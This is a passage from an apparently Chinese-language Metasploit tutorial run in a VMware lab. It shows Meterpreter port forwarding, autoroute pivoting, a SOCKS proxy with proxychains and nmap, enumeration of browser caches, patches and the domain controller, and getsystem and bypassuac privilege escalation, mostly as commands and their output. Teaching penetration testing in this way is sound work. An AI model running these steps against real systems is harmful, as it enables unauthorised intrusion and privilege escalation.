LISTEN       0     0      3824/svchost.exe</span><br><span class="line">    tcp6   :::5357                          :::*                 LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::49152                         :::*                 LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp6   :::49153                         :::*                 LISTEN       0     0      772/svchost.exe</span><br><span class="line">    tcp6   :::49154                         :::*                 LISTEN       0     0      900/svchost.exe</span><br><span class="line">    tcp6   :::49171                         :::*                 LISTEN       0     0      508/lsass.exe</span><br><span class="line">    tcp6   :::49176                         :::*                 LISTEN       0     0      500/services.exe</span><br><span class="line">    tcp6   :::49179                         :::*                 LISTEN       0     0      1908/svchost.exe</span><br><span class="line">    udp    0.0.0.0:123                      0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:500                      0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:4500                     0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    0.0.0.0:5004                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp    0.0.0.0:5005                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp    0.0.0.0:5355                     0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    0.0.0.0:52358                    0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:58751                    0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    0.0.0.0:62445                    0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:65389                    0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    127.0.0.1:1900                   0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    127.0.0.1:50203                  0.0.0.0:*                         0     0      508/lsass.exe</span><br><span class="line">    udp    127.0.0.1:52360                  0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    127.0.0.1:55889                  0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    127.0.0.1:64192                  0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    192.168.22.171:137               0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.22.171:138               0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.22.171:1900              0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.22.171:55887             0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.130.128:137              0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.130.128:138              0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.130.128:1900             0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.130.128:55888            0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::123                           :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::500                           :::*                              0     0      900/svchost.exe</span><br><span class="line">    udp6   :::3540                          :::*                              0     0      3824/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::4500                          :::*                              0     0      900/svchost.exe</span><br><span class="line">    udp6   :::5004                          :::*                              0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp6   :::5005                          :::*                              0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp6   :::5355                          :::*                              0     0      648/svchost.exe</span><br><span class="line">    udp6   :::52359                         :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::62446                         :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::65390                         :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   ::1:1900                         :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   ::1:55886                        :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::b96b:f6e6:3371:444f:1900   :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::b96b:f6e6:3371:444f:55884  :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:546    :::*                              0     0      772/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:1900   :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:55885  :::*                              0     0      1260/svchost.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    192.168.22.2     00:50:56:f2:7a:67  14</span><br><span class="line">    192.168.22.170   00:0c:29:92:d5:46  14</span><br><span class="line">    192.168.22.254   00:50:56:f5:66:dc  14</span><br><span class="line">    192.168.22.255   ff:ff:ff:ff:ff:ff  14</span><br><span class="line">    192.168.130.129  00:0c:29:74:6d:d0  11</span><br><span class="line">    192.168.130.254  00:50:56:f7:97:52  11</span><br><span class="line">    192.168.130.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  14</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  14</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  14</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  14</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getproxy </span><br><span class="line">Auto-detect     : Yes</span><br><span class="line">Auto config URL : </span><br><span class="line">Proxy URL       : </span><br><span class="line">Proxy Bypass    : </span><br><span class="line">meterpreter &gt; route</span><br><span class="line"></span><br><span class="line">IPv4 network routes</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Subnet           Netmask          Gateway          Metric  Interface</span><br><span class="line">    ------           -------          -------          ------  ---------</span><br><span class="line">    0.0.0.0          0.0.0.0          192.168.22.2     10      14</span><br><span class="line">    127.0.0.0        255.0.0.0        127.0.0.1        306     1</span><br><span class="line">    127.0.0.1        255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    127.255.255.255  255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    192.168.22.0     255.255.255.0    192.168.22.171   266     14</span><br><span class="line">    192.168.22.171   255.255.255.255  192.168.22.171   266     14</span><br><span class="line">    192.168.22.255   255.255.255.255  192.168.22.171   266     14</span><br><span class="line">    192.168.130.0    255.255.255.0    192.168.130.128  266     11</span><br><span class="line">    192.168.130.128  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    192.168.130.255  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        127.0.0.1        306     1</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.130.128  266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.22.171   266     14</span><br><span class="line">    255.255.255.255  255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.22.171   266     14</span><br><span class="line"></span><br><span class="line">No IPv6 routes were found.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h4><span id="portfwd-duan-kou-zhuan-fa">portfwd端口转发</span><a href="#portfwd-duan-kou-zhuan-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">portfwd delete -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口删除</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :6666 &lt;-&gt; 127.0.0.1:3389</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd delete -l 6666 -p 3389 -r 127.0.0.1</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:6666</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote          Direction</span><br><span class="line">   -----  -----         ------          ---------</span><br><span class="line">   1      0.0.0.0:6666  127.0.0.1:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd flush</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:6666</span><br><span class="line">[*] Successfully flushed 1 rules</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">No port forwards are currently active.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# rdesktop 127.0.0.1:6666</span><br><span class="line">Failed to negotiate protocol, retrying with plain RDP.</span><br><span class="line">WARNING: Remote desktop does not support colour depth 24; falling back to 16</span><br></pre></td></tr></table></figure>
<h4><span id="autoroute-tian-jia-lu-you">autoroute添加路由</span><a href="#autoroute-tian-jia-lu-you" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.130.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to 192.168.130.0/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.130.0/255.255.255.0 via 192.168.22.171</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.130.0      255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<p>然后可以利用<code>arp_scanner</code>、<code>portscan</code>等进行扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.130.0/24</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] ARP Scanning 192.168.130.0/24</span><br><span class="line">[+] 	IP: 192.168.130.1 MAC 00:50:56:c0:00:02 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.128 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.129 MAC 00:0c:29:74:6d:d0 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.255 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.254 MAC 00:50:56:f7:97:52 (VMware, Inc.)</span><br></pre></td></tr></table></figure>
<h4><span id="socks4a-dai-li">Socks4a代理</span><a href="#socks4a-dai-li" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; set srvhost 127.0.0.1</span><br><span class="line">msf &gt; set srvport 1080</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gedit /etc/proxychains.conf </span><br><span class="line"></span><br><span class="line">socks4 	127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sV 192.168.130.129</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-18 03:19 EST</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Nmap scan report for bogon (192.168.130.129)</span><br><span class="line">Host is up (0.0027s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds</span><br></pre></td></tr></table></figure>
<h2><span id="xin-xi-shou-ji">信息收集</span><a href="#xin-xi-shou-ji" class="header-anchor">#</a></h2><p>信息收集的脚本较多，仅列几个常用的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-7 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">meterpreter &gt; run post/windows/gather/forensics/enum_drives</span><br><span class="line"></span><br><span class="line">Device Name:                    Type:   Size (bytes):</span><br><span class="line">------------                    -----   -------------</span><br><span class="line">&lt;Physical Drives:&gt;</span><br><span class="line">\\.\PhysicalDrive0                   4702111234474983745</span><br><span class="line">&lt;Logical Drives:&gt;</span><br><span class="line">\\.\C:                               4702111234474983745</span><br><span class="line">\\.\D:                               4702111234474983745</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20181218215218_default_192.168.22.171_host.application_993878.txt</span><br><span class="line">meterpreter &gt; run post/windows/gather/dumplinks</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] Extracting lnk files for user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] No Recent Office files found for user Administrator. Nothing to do.</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: uknowsec</span><br><span class="line">[+] FOUND Domain Controller: WIN-0L310JHOGH6 (IP: 192.168.130.130)</span><br></pre></td></tr></table></figure>
<h2><span id="ti-quan">提权</span><a href="#ti-quan" class="header-anchor">#</a></h2><h3><span id="getsystem-ti-quan">getsystem提权</span><a href="#getsystem-ti-quan" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
<p><code>getsystem</code>工作原理：</p>
<ol>
<li><code>getsystem</code>创建一个新的<code>Windows</code>服务，设置为<code>SYSTEM</code>运行，当它启动时连接到一个命名管道。</li>
<li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li>
<li><code>Windows</code>服务已启动，导致与命名管道建立连接。</li>
<li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<code>SYSTEM</code>用户创建模拟令牌。</li>
<li>然后用新收集的<code>SYSTEM</code>模拟令牌产生<code>cmd.exe</code>，并且我们有一个<code>SYSTEM</code>特权进程。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br></pre></td></tr></table></figure>
<h3><span id="bypassuac">bypassuac</span><a href="#bypassuac" class="header-anchor">#</a></h3><p>内置多个<code>pypassuac</code>脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行<code>getsystem</code>获取系统权限，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>
